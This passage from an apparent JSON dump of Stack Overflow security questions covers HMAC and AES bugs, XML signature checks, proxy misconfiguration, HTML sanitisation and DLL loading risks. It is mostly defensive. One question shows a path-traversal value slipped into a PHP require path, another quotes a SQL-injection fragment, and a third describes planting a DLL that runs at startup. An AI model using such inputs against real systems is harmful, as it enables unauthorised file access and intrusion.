I'm exploring the best options extend this to user websites. I've considered Iframes but I fear that the non secure nature of the user's site would nullify any security measures I take. </p>\n\n<p>My other option may not be as user friendly but basically provide make it all work through API/Rest calls but this relies on the user's competency to setup. </p>\n\n<p>Basically what I want is is to have service hosted at <a href=\"https://myservice.com\" rel=\"nofollow\">https://myservice.com</a> and allow <a href=\"https://mywebsite.com\" rel=\"nofollow\">https://mywebsite.com</a> to integrate with the app created. I'd like to have a 3 part form to register and pay for an event but the primary focus is on security. </p>\n\n<p>So is my thinking completely off base? Do I need to do a lot more research? Or am I over thinking it? Thanks.</p>\n"},{"tags":["security","c#-4.0","hmac"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12415438,"title":"Signing a string with HMAC-MD5 with C#","body":"<p>I got the following HMAC key (in hexadecimal format):</p>\n\n<p>52320e181a481f5e19507a75b3cae4d74d5cfbc328f7f2b738e9fb06b2e05b55b632c1c3d331dcf3baacae8d3000594f839d770f2080910b52b7b8beb3458c08</p>\n\n<p>I need to sign this string:</p>\n\n<p>1100002842850CHF91827364</p>\n\n<p>The result should be this (in hexadecimal format):</p>\n\n<p>2ad2f79111afd818c1dc0916d824b0a1</p>\n\n<p>I have the following code:</p>\n\n<pre><code>string key = \"52320e181a481f5e19507a75b3cae4d74d5cfbc328f7f2b738e9fb06b2e05b55b632c1c3d331dcf3baacae8d3000594f839d770f2080910b52b7b8beb3458c08\";\nstring payload = \"1100002842850CHF91827364\";\n\nbyte[] keyInBytes = Encoding.UTF8.GetBytes(key);\nbyte[] payloadInBytes = Encoding.UTF8.GetBytes(payload);\n\nvar md5 = new HMACMD5(keyInBytes);\nbyte[] hash = md5.ComputeHash(payloadInBytes);\n\nvar result = BitConverter.ToString(hash).Replace(\"-\", string.Empty);\n</code></pre>\n\n<p>However, I am not getting the result. What am I doing wrong?</p>\n"},{"tags":["javascript","security","window.location"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12416773,"title":"Is using window.location a secure way to check that your script is only included on a specific site?","body":"<p>I'm building a service where customers will include a script on their site. I will bill customers based on their usage of the script (it connects to my server to use the service.), and I also have an iFrame version. Is it safe to check their window.location.host to check that the script was posted on their own website? Customers will have the option to specify multiple domains.</p>\n"},{"tags":["php","jquery","security","jquery-autocomplete"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12416410,"title":"Securing access to JQuery autocomplete helper","body":"<p>I've recently <a href=\"http://docs.jquery.com/UI/Autocomplete\" rel=\"nofollow\">setup an autocomplete on an input field with JQuery</a>. I set its source to be a publically accessible PHP page on my server.</p>\n\n<pre><code>$(document).ready(function() {\n    $(\"input#q\").autocomplete({\n        minLength: 3,\n        delay: 500,\n        autoFocus: true,\n        source: \"ac.php\"\n    });\n});\n</code></pre>\n\n<p>ac.php polls a search service running on the server after sanitizing input it receives.</p>\n\n<p>What I want to know is if there are any ways to force access to ac.php only via the autocomplete form? I was thinking checking referrers but that can be bypassed with tools like tamperdata.</p>\n\n<p>Do I even need to worry about leaving the helper publicly accessible?</p>\n\n<p>Thanks</p>\n"},{"tags":[".net","security","encryption","sign"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":76,"score":-1,"question_id":12415632,"title":"Do I use RSACryptoServiceProvider.SignHash to sign data?","body":"<p>Silly question but IIRC RSA can only encrypt a limited amount of bits based on its keysize. An asymmetric cypher can encrypt much more with the same key length (and runs faster). In that case can I sign only a limited amount of bits with <a href=\"http://msdn.microsoft.com/en-us/library/system.security.cryptography.rsacryptoserviceprovider.signhash.aspx\" rel=\"nofollow\">RSACryptoServiceProvider.SignHash</a>? or is it ok to use when signing and I don't need to use AES to sign it? (which I could do as the content is encrypted with AES).</p>\n"},{"tags":["php","security","testing"],"answer_count":7,"favorite_count":2,"up_vote_count":8,"down_vote_count":1,"view_count":852,"score":7,"question_id":1596454,"title":"How can I scan/fuzz my code for vulnerabilites?","body":"<p>I'm looking for an automated way to fuzz my app or scan it for vulnerabilities. Please assume that my hacking knowledge is 0. Also the source is on my localhost so I need a way to fuzz it locally without relying on an internet connection. Can some security experts give me some hints or recommendations? I'm not sure what options are best. </p>\n\n<p><strong>Edit:</strong></p>\n\n<p><strong>Thanks for the effort to answer, but none so far seems to get the point.</strong> I'd like to be more specific (because it helps the question) but without influencing opinions or sounding like I'm advertising a specific product. I'm looking for something like <a href=\"http://wapiti.sourceforge.net/\" rel=\"nofollow\" rel=\"nofollow\">wapiti</a> (sorry to mention names, but had to, because answers so far like learn about sql injections, xss etc. are obviously not real \"expert\" answers to this question. I already know about these (<strong>seriously, does this question sound like it could asked by someone who doesn't know salt about security?</strong>)</p>\n\n<p>I'm not asking <strong>whether</strong> I should test, I'm asking <strong>how</strong> I should test. I <strong>already decided</strong> to incorporate automation (and there's no turning back in this decision unless someone gives me an expert answer that proves it useless), so please respect my decision that I'd like to automate. I don't want to go through every compiled xss, sql injection, etc. hack list and try it manually myself against my site <strong>(even hackers don't hack that way)</strong>. Super extra points to anyone who gets the question.</p>\n\n<p><strong>Some people are asking why not just learn.</strong>\nBest practices (which I know) are not the same as knowing hacking. Some people want to argue they're a flip-coin, but I definitely don't agree :) hence I need a protection tool by someone with the \"hacker mentality\". How is that going to hurt, in fact, you should try it too ;) <strong>Expert answers please from those who know.</strong></p>\n"},{"tags":["php","apache","security","post","filtering"],"answer_count":1,"favorite_count":0,"up_vote_count":7,"down_vote_count":1,"view_count":414,"score":6,"question_id":12245039,"title":"Weird apache/PHP POST error","body":"<p>After a few hours of searching for the error, I've found a reproducable test. It uses a simple form:</p>\n\n<pre><code>&lt;form name=\"test\" method=\"POST\" action=\"test.php\"&gt;\n  &lt;textarea name=\"content\"&gt;&lt;/textarea&gt;\n  &lt;input name=\"submit\" type=\"submit\" value=\"send\"/&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>After filling the textarea with exactly <code>substring((SELECT</code> and hitting the button 'send' the server  returns a general error: <code>Connection with the server was reset while downloading</code>\nI looked into http error_log but there are no reports for this.</p>\n\n<p>Using:</p>\n\n<pre><code>Linux 2.6.32-220.23.1.el6.x86_64\nBuild Date  Jul 3 2012\nServer API  Apache 2.0 Handler \nApache Version  Apache/2.2.15 (CentOS) \nApache API Version  20051115 \nPHP Version 5.3.3\n</code></pre>\n\n<p>test.php has no PHP code there is only the form. If I rename the file to test.html and change action=\"test.html\" the error remains the same.</p>\n\n<p>Tested on FF 15 and Chrome 21, (ERR_CONNECTION_RESET)</p>\n\n<p>Firebug: POST test.php Aborted 192.168.1.1 0 192.168.1.1:80</p>\n\n<hr>\n\n<p>Is it possible that apache is filtering my POST data? I noticed that <strong>substring((SELECT</strong> is mentioned in several apache exploits. How can I disable this kind of filters?</p>\n\n<p>I can not see any mod_security in my modules. </p>\n"},{"tags":["xml","ios","security","digital-signature","xml-signature"],"answer_count":1,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":1706,"score":6,"question_id":5914508,"title":"How to verify an XML signature in an iOS application?","body":"<p>I've been tossed into the world of XML digital signatures with an iOS project I'm working on; I need to verify the digital signature of a SAML assertion.</p>\n\n<p>I've been reading a lot about validating XML signatures, and I think I get the basics about how it signs the digest with the private key and I can verify it with the public key (which should be in the included x509 certificate) so I can be certain of the SAML token's source.</p>\n\n<p>I found a C libray, <a href=\"http://www.aleksey.com/xmlsec/index.html\" rel=\"nofollow\">xmlsec</a>, that looks like it has a lot of the code I need for verifying the signature and have been working on trying to implement that. However, I haven't been able to figure it out. From what I understand, I'm pretty sure I would have to compile the library in with my code. I've copied the source into my project, but I get errors during compile about things not being defined.</p>\n\n<p>Before I spend countless hours heading down that path, I figured I would reach out to the community and see if anyone has had any experience verifying an xml digital signature and whether they could give insight on implementing that in an iOS project.</p>\n\n<p>For what it's worth, here's a chunk of the SAML assertion I'm getting from the single sign-on service:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-16\"?&gt;\n&lt;saml:Assertion ID=\"oQ2YZuHBspA_f91HM8o3.o6ZZla\" IssueInstant=\"2011-05-06T00:51:40.733Z\" Version=\"2.0\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\"&gt;\n&lt;saml:Issuer&gt;[...]&lt;/saml:Issuer&gt;\n&lt;ds:Signature xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"&gt;\n    &lt;ds:SignedInfo&gt;\n        &lt;ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/&gt;\n        &lt;ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/&gt;\n        &lt;ds:Reference URI=\"#oQ2YZuHBspA_f91HM8o3.o6ZZla\"&gt;\n            &lt;ds:Transforms&gt;\n                &lt;ds:Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/&gt;\n                &lt;ds:Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/&gt;\n            &lt;/ds:Transforms&gt;\n            &lt;ds:DigestMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#sha1\"/&gt;\n            &lt;ds:DigestValue&gt;zj4pCHBNMln+28Jq/v1YIScfiuw=&lt;/ds:DigestValue&gt;\n        &lt;/ds:Reference&gt;\n    &lt;/ds:SignedInfo&gt;\n    &lt;ds:SignatureValue&gt;[...]&lt;/ds:SignatureValue&gt;\n    &lt;ds:KeyInfo&gt;\n        &lt;ds:X509Data&gt;\n            &lt;ds:X509Certificate&gt;MIIDVjCCAj6gAwIBAgIGAS67wkWCMA0GCSqGSIb3[...]7bgf&lt;/ds:X509Certificate&gt;\n        &lt;/ds:X509Data&gt;\n        &lt;ds:KeyValue&gt;\n            &lt;ds:RSAKeyValue&gt;\n                &lt;ds:Modulus&gt;[...]&lt;/ds:Modulus&gt;\n                &lt;ds:Exponent&gt;AQAB&lt;/ds:Exponent&gt;\n            &lt;/ds:RSAKeyValue&gt;\n        &lt;/ds:KeyValue&gt;\n    &lt;/ds:KeyInfo&gt;\n&lt;/ds:Signature&gt;\n</code></pre>\n"},{"tags":["windows","security","password-protection"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12411832,"title":"Secure password capture and display","body":"<p>There is a lot of information on how to deal with sensitive data once it's in program memory.  For Windows C# development, I've read that using Microsoft's DPAPI, GC-pinned byte[], and possibly SecureString are the best way limit the exposure of passwords in an application.  But what about getting the password to/from the user?</p>\n\n<p>If I were making a KeyPass-like application, what is the expectation for securely capturing the password from the user.  How about displaying secret data to the user?  Most UI controls that I know of use standard, managed and unpinned strings to capture or display data.  Seems to me that this last-mile to the user is the weakest link and threatens the efforts I might make in the rest of the program.</p>\n\n<p>I want to know what can and cannot be done by the operating environment and my application to secure against system-local threats.  I figure there are just some parts of such applications that cannot be protected - perhaps there is nothing that could make the password entry invisible to keyloggers.  But I don't know where the limit is - what the expectation is for secure software?</p>\n\n<p>Perhaps the answer is platform-specific, so I'm most interested in Windows 7 and later.  Can the same security be achieved using managed code (C# and .NET) vs unmanaged code?</p>\n\n<p>Windows offers creduipromptforcredentials and similar available through PInvoke.  This dialog is not really optimized for all situations.  Is it just a convenience or does it offer security mechanisms that are not available to custom code?</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","proxy","terminology","definitions","overuse"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":52,"score":-2,"question_id":12398389,"title":"Different definitions of the term \"proxy\"? Its origin? Explain their etymology, how to remember the terms?","body":"<p>I am trying to understand the loaded term <code>\"proxy\"</code> deeper. So what are its different definitions?</p>\n\n<p><strong>Helper questions</strong></p>\n\n<blockquote>\n  <ol>\n  <li><p>What is a proxy between two users?</p></li>\n  <li><p>Is Tanenbaum's <code>web-proxy</code> the same as <code>gateway</code> or <code>\"tunneling proxy\"</code> in Wikipedia <a href=\"http://en.wikipedia.org/wiki/Proxy_server\" rel=\"nofollow\">here</a>?</p></li>\n  <li><p>Are resource/user -proxies equivalent to forward/reverse -proxies respectively? More <a href=\"http://stackoverflow.com/a/12397457/164148\">here</a>.</p></li>\n  <li><p>Are things such as \"Amazon Kindle -books\" and \"Apple App Store -apps\" examples of Tanenbaum's \"object proxy\"? The information is with the user but the common interface is for everyone to use. The verification is some sort of implementation with OAouth 2.0 where paying creates an access token for the user. If user breaks ToS, the authorities will just remove the access-tokens. It looks like you buy something physical but you buy only rights to use with certain criteria. Is this interpretation correct? Are they actually <code>\"object -proxies\"</code>?</p></li>\n  <li><p>What is Apache's mod-proxy for? Is it a proxy and which kind of proxy? How do you define it? More <a href=\"http://stackoverflow.com/questions/12397242/explain-apache-mod-proxy-module-is-it-overused-and-many-times-a-red-herring-w\">here</a>.</p></li>\n  <li><p>Is the term <code>\"proxy\"</code> overused? What is the origin of the term?</p></li>\n  </ol>\n</blockquote>\n\n<p><strong>Perhaps related</strong></p>\n\n<blockquote>\n  <ol>\n  <li><a href=\"http://stackoverflow.com/questions/12397349/what-is-a-proxy-what-is-it-in-apache-does-it-have-many-different-meanings\">What is a proxy? What is it in Apache? Does it have many different meanings?</a></li>\n  </ol>\n</blockquote>\n"},{"tags":["android","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12408843,"title":"Protect non-market android app from illegal copies","body":"<p>I would like to know how it is possible to protect an Android application from illegal copies not going through the Android market.</p>\n\n<p>I know I can protect the code against reverse-engineering using ProGuard. </p>\n\n<p>I am wondering if there is a good solution to avoid anyone to copy the apk file to another device and install the app. Since I will have full control of all the devices where the application will be installed (it is a company internal app), would it be possible to link the app to the device serial number? In that case the app will run only on those devices which serial number is in a list of allowed ones.</p>\n\n<p>I am not looking for hyper security, I just want to keep the casual pirate away. I understand a professional hacker would hack it anyway if he wanted to.</p>\n\n<p>Any suggestion?? </p>\n\n<p>Many Thanks</p>\n"},{"tags":["c#","security","cryptography","aes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12407635,"title":"AES decrypts half of string correctly with invalid IV, Is that usual?","body":"<p>I'm testing AES encryption functions from <a href=\"http://msdn.microsoft.com/en-us/library/system.security.cryptography.aesmanaged.aspx\" rel=\"nofollow\">this example</a>. I have found that If I change <code>IV</code> to another random data, just a part of text will become inaccessible, and the other part will decrypt correctly.</p>\n\n<p>This is my code:</p>\n\n<pre><code>    public static string encrypt(string original, string key, string iv)\n    {\n        string enc;\n        // Create a new instance of the RijndaelManaged\n        // class.  This generates a new key and initialization \n        // vector (IV).\n        // Encrypt the string to an array of bytes.\n        byte[] encrypted =EncryptStringToBytes_Aes(original, Convert.FromBase64String(key), Convert.FromBase64String(iv));\n\n        enc = Convert.ToBase64String(encrypted);\n\n        return enc;\n    }\n\n    public static string decrypt(string encrypted, string key, string iv)\n    {\n        string decrypted;\n\n        decrypted = DecryptStringFromBytes_Aes(Convert.FromBase64String(encrypted), Convert.FromBase64String(key), Convert.FromBase64String(iv));\n\n        return decrypted;\n    }\n</code></pre>\n\n<p><a href=\"http://paste2.org/p/2218956\" rel=\"nofollow\">And these are my <code>EncryptStringToBytes_Aes</code> and <code>DecryptStringFromBytes_Aes</code> functions.</a></p>\n\n<p>For example, my input string is <code>Hello, I think Hugo is a great movie!</code>. It will be encrypted to <code>lbMvxzBtu057yeNV5d/5MC7tlau7zfRXMtfLSUOBa7ueMGqRrm23H5uYGLmDcdJ3</code> with <em>base64ed</em> key <code>gbpldgjBitwQXrQbbyHr+5J0cXADYAm+po8B29rYVJc=</code> and <em>base64ed</em> IV <code>Ti7OcORScdXS/Ll7m1KdeQ==</code>. (I'm getting base64ed key and IVs as input of my functions, and I decode them in my function, as you can see in the code above)</p>\n\n<p>Now if I change IV to <code>m4u5eqD7BZP11P5PYGfV7Q==</code> but do not touch the key, then try to decrypt the encrypted string, I'll give this result: <code>f+T\\/]^hugo is a great movie!</code>.</p>\n\n<p>As you see, a part of input string (<code>ugo is a great movie!</code>) was decrypted successfully. Is that usual? If yes, How to prevent this? Is there any other algorithms which are more secure than this? And if no, What is wrong with my code?</p>\n"},{"tags":["security","apache2","reverse-proxy","mod-proxy"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12407209,"title":"Configuring mod_proxy for Apache to reject wrong domain requests","body":"<p>Recently, I noticed my website was running slower and slower. I discovered 8GB Apache logs on my server (I run a Play!Framework web application on a Debian 6 server) and a bandwidth completely overloaded. Which was completely insane for a small personal website with a few views per day.</p>\n\n<p>After investigating and gathering some information, I discovered my mistake : on my Apache configuration, I had uncommented the line \"ProxyRequests On\", so my server was freely used as a free proxy for everybody in the world. What a shame.</p>\n\n<p>At least in that time, I adjusted my firewall to limit concurrent connections, and installed mod_qos for Apache2.</p>\n\n<p>But still, now instead of redirecting requests to their destination like a good free proxy, all incoming requests are redirected to my web application, whatever the domain is. For example if someone uses my server thinking it is still a working proxy to search for \"young naked children\" on yahoo, he will fall on my website. I think now you see my point.</p>\n\n<p>Then, what should I do so that if a request for \"http://yahoo.com/whatever\" is sent to my server, the request is simply denied ?</p>\n\n<p>Here is my current configuration :</p>\n\n<ul>\n<li><p>in <strong>/etc/init.d/apache2/sites-available/mysite.fr</strong> :</p>\n\n<p>ProxyRequests Off\nNameVirtualHost *:80</p>\n\n<p>VirtualHost *:80</p>\n\n<pre><code> ServerName mysite.fr\n ServerAlias *.mysite.fr\n\n ProxyPreserveHost On\n ProxyPass / http://127.0.0.1:9000/ retry=0\n ProxyPassReverse /  http://127.0.0.1:9000\n\n # Uncomment the line below if your site uses SSL.\n #SSLProxyEngine On\n</code></pre>\n\n<p>/VirtualHost</p></li>\n<li><p>in <strong>/etc/init.d/apache2/mods-available/proxy.conf</strong> :</p></li>\n</ul>\n\n<p>ProxyRequests Off\n</p>\n\n<pre><code>AddDefaultCharset off\nOrder deny,allow\nAllow from all\n</code></pre>\n\n<p></p>\n"},{"tags":["html","security","input","user"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12406590,"title":"Show HTML user input, security issue","body":"<p>On my website, users will be able to input html tags for the content so the text can be bold, italic or links and image. I plan to use ckeditor or tinymce which are really using HTML tags (not BBC code or wiki syntax)\nIf I allow HTML, when the text will be shown it will be interpreted and it may contain some \"hack\" like javascript or XSS....\nHow can I do to avoid this security issue ?\nDo I have to list the wanted html tags and to delete all unwanted tags and content ?\nCan I use strip tags for this ?</p>\n\n<p>How is it done on stackoverflow for example ?</p>\n\n<p>Do you know some plugin php/jquery plugins who can safely save and safely interpret limited html tags ?</p>\n\n<p>Thanks in advance for your help</p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12405818,"title":"php require file path escaping","body":"<p>Now I'm wondering if is is safe to require files with only <code>require($path)</code>.</p>\n\n<p>For <em>just simpliest example</em>:<br/>\nI have some form field <code>folder</code> and <code>name</code>. So when I do <code>require($somepath.'/'.$folder.'/'.$name.'.php')</code> it can be easily relocated with inputing '../../admin/or/else/things/'.<br/></p>\n\n<p>It is simple example, but there are (i expect so) many other ways to relocate <code>$path</code>.</p>\n\n<p>So the question is:<br/>\n- provide checks of incoming path?<br/>\n- if yes.. so how do it correctly?</p>\n"},{"tags":["iphone","cocoa-touch","security","iphone-sdk-4.0","aes"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":587,"score":1,"question_id":4883398,"title":"iPhone AES encryption issue","body":"<p>I use following code to encrypt using AES.</p>\n\n<pre><code>- (NSData*)AES256EncryptWithKey:(NSString*)key theMsg:(NSData *)myMessage {\n\n    // 'key' should be 32 bytes for AES256, will be null-padded otherwise\n    char keyPtr[kCCKeySizeAES256 + 1]; // room for terminator (unused)\n    bzero(keyPtr, sizeof(keyPtr)); // fill with zeroes (for padding)\n\n    // fetch key data\n    [key getCString:keyPtr maxLength:sizeof(keyPtr) encoding:NSUTF8StringEncoding];\n\n    NSUInteger dataLength = [myMessage length];\n\n    //See the doc: For block ciphers, the output size will always be less than or\n    //equal to the input size plus the size of one block.\n    //That's why we need to add the size of one block here\n    size_t bufferSize           = dataLength + kCCBlockSizeAES128;\n    void* buffer                = malloc(bufferSize);\n\n    size_t numBytesEncrypted    = 0;\n    CCCryptorStatus cryptStatus = CCCrypt(kCCEncrypt, kCCAlgorithmAES128, kCCOptionPKCS7Padding,\n                                          keyPtr, kCCKeySizeAES256,\n                                          NULL /* initialization vector (optional) */,\n                                          [myMessage bytes], dataLength, /* input */\n                                          buffer, bufferSize, /* output */\n                                          &amp;numBytesEncrypted);\n\n    if (cryptStatus == kCCSuccess)\n    {\n        //the returned NSData takes ownership of the buffer and will free it on deallocation\n        return [NSData dataWithBytesNoCopy:buffer length:numBytesEncrypted];\n    }\n\n    free(buffer); //free the buffer;\n    return nil;\n}\n</code></pre>\n\n<p>However the following code chunk returns null if I tried to print the encryptmessage variable. Same thing applies to decryption as well. What am I doing wrong here?</p>\n\n<pre><code> NSData *encrData = [self AES256EncryptWithKey:theKey theMsg:myMessage];\n NSString *encryptmessage = [[NSString alloc] initWithData:encrData encoding:NSUTF8StringEncoding];\n</code></pre>\n\n<p>Thank you</p>\n"},{"tags":["security","actionscript-3"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1270,"score":0,"question_id":2942634,"title":"Loading image from external domain in Flash AS3","body":"<p>I have to load XML from external domain, so my code looks like this</p>\n\n<pre><code>var loader:URLLoader = new URLLoader();\n        configureListeners(loader);\n\n        var request:URLRequest = new URLRequest(\"http://demo.softsolutions4u.com/ss4uplayer/modules/podcast/lib/PlayerAPI.php\");\n        try {\n            loader.load(request);\n        } catch (error:Error) {\n            trace(\"Unable to load requested document.\");\n        }\n\n        function configureListeners(dispatcher:IEventDispatcher):void {\n            dispatcher.addEventListener(Event.COMPLETE, completeHandler);\n            dispatcher.addEventListener(SecurityErrorEvent.SECURITY_ERROR, securityErrorHandler);\n         }\n\n        function completeHandler(event:Event):void {\n            var loader:URLLoader = URLLoader(event.target);\n            trace(\"completeHandler: \" + loader.data);\n            datas.appendText(\"completeHandler: \" +loader.data);\n        }\n\n\n        function securityErrorHandler(event:SecurityErrorEvent):void {\n            trace(\"securityErrorHandler: \" + event);\n            datas.appendText(\"securityErrorHandler: \" +event);\n        }\n</code></pre>\n\n<p>But it throws exception at run time </p>\n\n<pre><code>securityErrorHandler: [SecurityErrorEvent type=\"securityError\" bubbles=false cancelable=false eventPhase=2 text=\"Error #2048: Security sandbox violation: http://192.168.2.55/onlinemovie/Development/SS4UPlayer310310/test.swf cannot load data from http://demo.softsolutions4u.com/ss4uplayer/modules/podcast/lib/PlayerAPI.php.\"\n</code></pre>\n\n<p>Crossdomain XML file also loaded and security allodomain is in(*).\nPlease tell me what I missed here.</p>\n\n<hr>\n\n<p>its not like that. We are not going to use the flash swf file, but our 'N' no of clients going to use this swf in their server, so then in that case how could i place the crossdomain.xml. I dont know where i should put it. Please help me to fix it.</p>\n"},{"tags":["security","internet-explorer"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":2528,"score":4,"question_id":4663509,"title":"how do sites run in IE without asking for \"allow scripts/activeX\"?","body":"<p>I have tried googling this and have not come up with any good leads...</p>\n\n<p>I have a webpage I'm testing (it's an html document on my local machine).</p>\n\n<p>When loaded, <em>IE asks if I want to allow scripts and activeX</em> (I don't get why they are considered equally dangerous)</p>\n\n<p>Popular sites like cnn.com and stackoverflow.com don't ask me if I want to run scripts, they just do.  How and why does this occur?  Do I have to do something special to keep this from happening?  (There is a prompt, but I don't want this to appear for my normal users)</p>\n"},{"tags":["algorithm","security","powerbuilder","hashalgorithm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":12352815,"title":"SHA 256 Algorithm in Power Builder 6.5","body":"<p>I am trying to store the data as secured possible way in database.\n  For that I am triyng to implement the SHA-256 algorithm in Powerbuilder version 6.5.\n  This sound old that I am implememting the SHA 256 in PowerBuilder (Desktop Application Development Tool).\n  Though yet it is outdated we need to implement this secure functionality in PowerBuilder\n  Because lots of applications are dependant on it.</p>\n\n<p>I Googled for any library for PB 6.5 for SHA256 but didn't get anything.\n  So please can any one tell me how can I <strong>achieve this SHA-256</strong> in PowerBuilder or is there any ready library available fot SHA256 for PB 6.5.</p>\n\n<p>Thanks in Advance.</p>\n"},{"tags":["security","dll","dllimport","dllregistration","dll-injection"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":315,"score":1,"question_id":7927171,"title":"What's the best way to secure dll files","body":"<p>We have a large application build in <strong>C++ builder</strong>, that at startup <strong>looks at a folder and loads all the present dll files</strong>. I figured this might not be such a good thing and tried my thoughts by creating a dll that only fired up a web browser and opened a picture with the word owned :P</p>\n\n<p>Anyway, it worked. So the system could be compromised in any way by a dll being switched out or a new one added. Remote admin access, format drives, you name it.</p>\n\n<p>So my thoughts went toward trying to plug this hole. What's the best practice for this? I was thinking of some kind of <strong>signing of the dll's</strong>. Having the .exe holding a <strong>list of names of valid dll's</strong> doesn't actually solve it since a dll could be replaces. A <strong>list of names and checksums</strong> would work, but would be nice to keep the auto-loading feature but only load correctly <strong>signed dll's</strong>.</p>\n\n<p>Edit: I'm looking into using <strong>signtool.exe</strong> which seems to do the job. But I can't find any good reference as how to actually <strong>check the signature of the dll in C++</strong> afterwards. Anyone who has a link?</p>\n"},{"tags":["security","ubuntu-12.04","skipfish"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":203,"score":1,"question_id":12399248,"title":"skipfish - error in make","body":"<p>I'm trying to use skipfish on ubuntu latest version that I just downloaded. I'm following the instruction from this link <a href=\"http://digitivity.org/943/how-to-install-google-skipfish-on-ubuntu-linux\" rel=\"nofollow\">http://digitivity.org/943/how-to-install-google-skipfish-on-ubuntu-linux</a></p>\n\n<p>When I run \"nice make\" based on the article, I got this error below... Could anyone please help me to give some pointers to fix this issue? Thanks in advance.</p>\n\n<pre><code>michaelsync@ubuntu:~/Downloads/skipfish-2.09b$ nice make\ncc -L/usr/lib/ssl/engines -L/usr/lib/ -L/usr/lib/ssl/ -L/usr/local/lib/ -L/opt/local/lib src/skipfish.c -o skipfish \\\n        -O3 -Wno-format -Wall -funsigned-char -g -ggdb -I/usr/local/include/ -I/opt/local/include/ -I/usr/include/ -DVERSION=\\\"2.09b\\\" src/http_client.c src/database.c src/crawler.c src/analysis.c src/report.c src/checks.c src/signatures.c src/auth.c -lcrypto -lssl -lidn -lz -lpcre\nIn file included from src/skipfish.c:47:0:\nsrc/signatures.h:24:18: fatal error: pcre.h: No such file or directory\ncompilation terminated.\nsrc/http_client.c:40:18: fatal error: idna.h: No such file or directory\ncompilation terminated.\nIn file included from src/analysis.c:32:0:\nsrc/signatures.h:24:18: fatal error: pcre.h: No such file or directory\ncompilation terminated.\nsrc/signatures.c:27:18: fatal error: pcre.h: No such file or directory\ncompilation terminated.\nmake: *** [skipfish] Error 1\n</code></pre>\n"},{"tags":["security","login","microcontroller","lwip"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12399519,"title":"lwIP on Stellaris 32-bit microcontroller - Secure Login","body":"<p>I wish to use my Stellaris LM3S8962 microcontroller as a bridge between internet and a bunch of sensors. I will be using Zigbee nodes for communication from the sensors to the microcontroller. I have been able to use the lwIP TCP/IP stack (for LM3S8962) to access HTML pages stored in the controller's flash.</p>\n\n<p>Now, I want to add a secure login system for the same. What I basically want is that - when I enter the IP of the controller in the browser, it should prompt me for a username and a password. I want to make this system as secure as possible using the lwIP TCP/IP stack.</p>\n\n<p>FYI, the stack does not support PHP or any other scripts. CGI feature (in C) is supported but I don't know how to implement the security part. Please guide.</p>\n"},{"tags":["c#","asp.net","security","web-applications"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12398826,"title":"HOw to get url contents of weblink","body":"<p>SUppose I have a web application which userID is required to pass </p>\n\n<p>Weblink of the previous page is </p>\n\n<p><a href=\"http://app1.faceicicle.com/admin/entryAction.do?action=first&amp;locale=&amp;sessionID=5q2m04k9c5362p50b17b63p53679jx25&amp;login=8121support&amp;prjLinkURL=&amp;moduelType=&amp;reminderLink=&amp;toModule=&amp;toProject=\" rel=\"nofollow\">http://app1.faceicicle.com/admin/entryAction.do?action=first&amp;locale=&amp;sessionID=5q2m04k9c5362p50b17b63p53679jx25&amp;login=8121support&amp;prjLinkURL=&amp;moduelType=&amp;reminderLink=&amp;toModule=&amp;toProject=</a></p>\n\n<p>How to get the value of the user ID , session ID or the password ? </p>\n"},{"tags":["c#","security","permissions","dns"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12389151,"title":"Application use Domain Account for security","body":"<p>Is there a way to implement domain authentication for a group of users in a winform application?</p>\n\n<p>I am writing an application in C# that is going to be installed on a few PC's in our shop. I want to password protect a portion of the programs functions, basically the configuration. I could easily hard-code a password into the application or even make an encrypted password store but I want only certain users to be able to access the configuration form and I want to manage those users centrally from our domain using a group. So anyone belonging to the \"configure\" group can access the form, press an apply button, 